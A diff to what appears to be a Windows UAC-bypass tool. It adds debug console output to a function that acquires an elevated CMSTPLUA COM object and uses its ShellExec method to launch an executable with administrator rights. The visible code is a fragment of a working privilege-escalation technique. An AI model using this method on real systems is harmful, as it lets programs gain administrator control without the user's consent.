@@ -37,6 +37,9 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
+    ucmConsolePrintText(TEXT("[41] target executable"), lpszExecutable);
+    ucmConsolePrintStatus(TEXT("[41] CoInitializeEx"), hr_init);
+
     do {
 
         r = ucmAllocateElevatedObject(
@@ -45,11 +48,17 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
             CLSCTX_LOCAL_SERVER,
             (void**)&CMLuaUtil);
 
+        ucmConsolePrintStatus(TEXT("[41] CoGetObject(Elevation:Administrator!new:CMSTPLUA)"), r);
+
         if (r != S_OK)
             break;
 
-        if (CMLuaUtil == NULL)
+        if (CMLuaUtil == NULL) {
+            ucmConsolePrint(TEXT("[41] CMLuaUtil is NULL\r\n"));
             break;
+        }
+
+        ucmConsolePrint(TEXT("[41] elevated object acquired, calling ShellExec\r\n"));
 
         r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
             lpszExecutable,
@@ -57,6 +66,8 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
             NULL,
             SEE_MASK_DEFAULT,
             SW_SHOW);
+
+        ucmConsolePrintStatus(TEXT("[41] ICMLuaUtil::ShellExec"), r);
 
         if (SUCCEEDED(r))
             MethodResult = STATUS_SUCCESS;
@@ -69,6 +80,8 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
 
     if (hr_init == S_OK)
         CoUninitialize();
+
+    ucmConsolePrintStatus(TEXT("[41] MethodResult"), MethodResult);
 
     return MethodResult;
 }
